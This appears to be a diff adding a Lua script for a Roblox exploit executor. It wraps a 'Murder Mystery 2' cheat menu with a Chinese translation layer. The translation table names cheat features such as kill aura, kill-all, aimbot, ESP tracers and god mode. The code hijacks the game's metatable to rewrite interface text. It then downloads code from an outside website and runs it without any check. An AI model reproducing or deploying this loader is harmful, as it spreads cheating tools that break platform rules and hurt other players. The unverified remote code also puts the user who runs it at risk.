@@ -1,0 +1,245 @@
+local Translations = {
+    ["玩家"] = "玩家",
+    ["玩家 1"] = "玩家 1",
+    ["用户界面"] = "用户界面",
+    ["Inventory"] = "库存",
+    ["MENTORY"] = "菜单",
+    ["IMPENDERLY"] = "功能面板",
+    ["IMPENTORY"] = "库存",
+    ["MURDERLY"] = "信息面板",
+    ["Murder Mystery 2 space scripts"] = "Murder Mystery 2 空间脚本",
+    ["Murder Mystery 2"] = "谋杀之谜 2",
+    ["MURDER MYSTERY 2"] = "谋杀之谜 2",
+    ["space scripts"] = "空间脚本",
+    ["Search"] = "搜索",
+    ["Main functions"] = "主要功能",
+    ["Main"] = "主要",
+    ["Farming"] = "刷取",
+    ["spawner"] = "生成器",
+    ["Murder"] = "杀手功能",
+    ["Fun"] = "娱乐",
+    ["Sheriff"] = "警长功能",
+    ["Esp"] = "透视",
+    ["Extra"] = "额外功能",
+    ["Funcion"] = "功能",
+    ["Force Sheriff to Shoot"] = "强制警长开枪",
+    ["Auto Force Sheriff to Shoot"] = "自动强制警长开枪",
+    ["Auto Break Gun"] = "自动破坏枪支",
+    ["Break Gun"] = "破坏枪支",
+    ["Faces Sheriff to Shoot"] = "强制警长开枪",
+    ["Fans Sheriff to Shoot"] = "强制警长开枪",
+    ["Shariff"] = "警长",
+    ["Shefff"] = "警长",
+    ["Auto Get Gun"] = "自动拾枪",
+    ["Gun Drop Alert"] = "掉枪提示",
+    ["Notify"] = "通知",
+    ["Fire alarm"] = "火警警报",
+    ["Oof"] = "阵亡音效",
+    ["Windows Notify System"] = "Windows 系统通知",
+    ["Samsung Notification"] = "三星通知",
+    ["Custom"] = "自定义",
+    ["Gun sfx"] = "枪支音效",
+    ["Discord"] = "Discord 通知",
+    ["Auto farm gul"] = "自动刷取金币",
+    ["Kill Random Player"] = "随机击杀玩家",
+    ["Kill Aura"] = "击杀光环",
+    ["Kill Aura Distance"] = "击杀光环距离",
+    ["Kill All players"] = "击杀所有玩家",
+    ["Aimbot and stuff"] = "自动瞄准等功能",
+    ["Aimlock (Torso)"] = "锁定躯干瞄准",
+    ["Auto Shoot Murderer"] = "自动射击杀手",
+    ["Enable aimbot"] = "启用自动瞄准",
+    ["gun shoots at murder when key is clicked"] = "点击按键时向杀手开枪",
+    ["Shoot Key"] = "射击按键",
+    ["Keybind to use"] = "使用的按键绑定",
+    ["Distance Behind Murderer"] = "与杀手的背后距离",
+    ["Height Above Murderer"] = "杀手上方高度",
+    ["Heighs Above Murderer"] = "杀手上方高度",
+    ["Sheriff/Hero Skeleton"] = "警长/英雄骨骼",
+    ["Dead Skeleton"] = "死亡者骨骼",
+    ["Imocent Tracers"] = "无辜者轨迹线",
+    ["Murderer Tracers"] = "杀手轨迹线",
+    ["Sheriff/Hero Tracers"] = "警长/英雄轨迹线",
+    ["Innocent Highlights"] = "无辜者高亮",
+    ["Murderer Highlights"] = "杀手高亮",
+    ["Sheriff/Hero Highlights"] = "警长/英雄高亮",
+    ["Dead Highlights"] = "死亡者高亮",
+    ["Innocent Skeleton"] = "无辜者骨骼",
+    ["Murderer Skeleton"] = "杀手骨骼",
+    ["Select Emote"] = "选择表情",
+    ["Do an emote"] = "执行表情",
+    ["Seizure Mode"] = "癫痫模式",
+    ["headless"] = "无头",
+    ["zombie"] = "僵尸",
+    ["wave"] = "挥手",
+    ["cheer"] = "欢呼",
+    ["laugh"] = "大笑",
+    ["sit"] = "坐下",
+    ["ninja"] = "忍者",
+    ["dab"] = "Dab姿势",
+    ["floss"] = "弗洛斯舞",
+    ["Zen"] = "禅模式",
+    ["Server Join Link"] = "服务器加入链接",
+    ["Max Players"] = "最大玩家数",
+    ["Join Server"] = "加入服务器",
+    ["Server Hop"] = "服务器跳转",
+    ["Rejoin Server"] = "重新加入服务器",
+    ["Run"] = "运行",
+    ["Servers"] = "服务器",
+    ["Click to copy Discord Invite"] = "点击复制Discord邀请",
+    ["Toggle UI Keybird"] = "切换UI按键",
+    ["Toggle UI Keybind"] = "切换UI按键绑定",
+    ["Keybird to open or close the UI"] = "打开/关闭UI的按键",
+    ["Keybind to open or close the UI"] = "打开/关闭UI的按键绑定",
+    ["Rightshift"] = "右Shift键",
+    ["Invisible"] = "隐身",
+    ["Arinder+5L"] = "Arinder+5L",
+    ["Gun Drop Sound"] = "掉枪音效",
+    ["Preview Gun Drop Sound"] = "预览掉枪音效",
+    ["Custom Gun Drop Sound URL"] = "自定义掉枪音效URL",
+    ["rbxassetid://YourS"] = "rbxassetid://你的音效ID",
+    ["Game Info"] = "游戏信息",
+    ["Welcome, QQQQ32173"] = "欢迎，QQQQ32173",
+    ["report bugs to me on my discord"] = "发现漏洞请通过Discord向我报告",
+    ["Copy invite → Okay"] = "复制邀请链接 → 确定",
+    ["Murder: mashedpotato1be454"] = "杀手：mashedpotato1be454",
+    ["Sheriff: 9090anto"] = "警长：9090anto",
+    ["Gun Dropped: No"] = "枪已掉落：否",
+    ["God mode"] = "上帝模式",
+    ["FOV"] = "视野",
+    ["Anti Fling"] = "防甩飞",
+    ["Weapon Visuals by jsp"] = "武器视觉效果 by jsp",
+    ["amount to get"] = "获取数量",
+    ["10:0"] = "10:0",
+    ["give random godly"] = "给予随机神级武器",
+    ["Item Spawner"] = "物品生成器",
+    ["Weapon Name"] = "武器名称",
+    ["E.g. Harvester"] = "例如：收割者",
+    ["Amount"] = "数量",
+    ["E.g. 5"] = "例如：5",
+    ["100"] = "100",
+    ["VISUAL WARNING"] = "视觉警告",
+    ["All items are in fact visual and not real, you do not get to keep any of the items after rejoining the game they are only for show and do not actually exist. In your inventory don't be a dumbass and think its real."] = "所有物品均为视觉效果，并非真实。重新加入游戏后你将无法保留任何物品，它们仅供展示，实际上并不存在。在你的库存中，别犯傻以为它们是真的。",
+    ["Close Window"] = "关闭窗口",
+    ["Do you want to close this window? You will not be able to open it again."] = "您确定要关闭此窗口吗？关闭后将无法再次打开。",
+    ["Cancel"] = "取消",
+    ["Exit"] = "退出",
+    ["Round Timer"] = "回合计时器",
+    ["SCHOOL"] = "学校",
+    ["WATER"] = "水域",
+    ["MURDER"] = "杀手",
+}
+
+local function translateText(text)
+    if not text or type(text) ~= "string" then return text end
+    
+    if Translations[text] then
+        return Translations[text]
+    end
+    
+    for en, cn in pairs(Translations) do
+        if text:find(en) then
+            return text:gsub(en, cn)
+        end
+    end
+    
+    return text
+end
+
+local function setupTranslationEngine()
+    local success, err = pcall(function()
+        local oldIndex = getrawmetatable(game).__newindex
+        setreadonly(getrawmetatable(game), false)
+        
+        getrawmetatable(game).__newindex = newcclosure(function(t, k, v)
+            if (t:IsA("TextLabel") or t:IsA("TextButton") or t:IsA("TextBox")) and k == "Text" then
+                v = translateText(tostring(v))
+            end
+            return oldIndex(t, k, v)
+        end)
+        
+        setreadonly(getrawmetatable(game), true)
+    end)
+    
+    if not success then
+        warn("元表劫持失败:", err)
+       
+        local translated = {}
+        local function scanAndTranslate()
+            for _, gui in ipairs(game:GetService("CoreGui"):GetDescendants()) do
+                if (gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox")) and not translated[gui] then
+                    pcall(function()
+                        local text = gui.Text
+                        if text and text ~= "" then
+                            local translatedText = translateText(text)
+                            if translatedText ~= text then
+                                gui.Text = translatedText
+                                translated[gui] = true
+                            end
+                        end
+                    end)
+                end
+            end
+            
+            local player = game:GetService("Players").LocalPlayer
+            if player and player:FindFirstChild("PlayerGui") then
+                for _, gui in ipairs(player.PlayerGui:GetDescendants()) do
+                    if (gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox")) and not translated[gui] then
+                        pcall(function()
+                            local text = gui.Text
+                            if text and text ~= "" then
+                                local translatedText = translateText(text)
+                                if translatedText ~= text then
+                                    gui.Text = translatedText
+                                    translated[gui] = true
+                                end
+                            end
+                        end)
+                    end
+                end
+            end
+        end
+        
+        local function setupDescendantListener(parent)
+            parent.DescendantAdded:Connect(function(descendant)
+                if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
+                    task.wait(0.1)
+                    pcall(function()
+                        local text = descendant.Text
+                        if text and text ~= "" then
+                            local translatedText = translateText(text)
+                            if translatedText ~= text then
+                                descendant.Text = translatedText
+                            end
+                        end
+                    end)
+                end
+            end)
+        end
+        
+        pcall(setupDescendantListener, game:GetService("CoreGui"))
+        local player = game:GetService("Players").LocalPlayer
+        if player and player:FindFirstChild("PlayerGui") then
+            pcall(setupDescendantListener, player.PlayerGui)
+        end
+        
+        while true do
+            scanAndTranslate()
+            task.wait(3)
+        end
+    end
+end
+
+task.wait(2)
+
+setupTranslationEngine()
+
+local success, err = pcall(function()
+loadstring(game:HttpGet("https://globalexp.xyz/Mm22"))()
+
+
+end)
+
+if not success then
+    warn("加载失败:", err)
+end
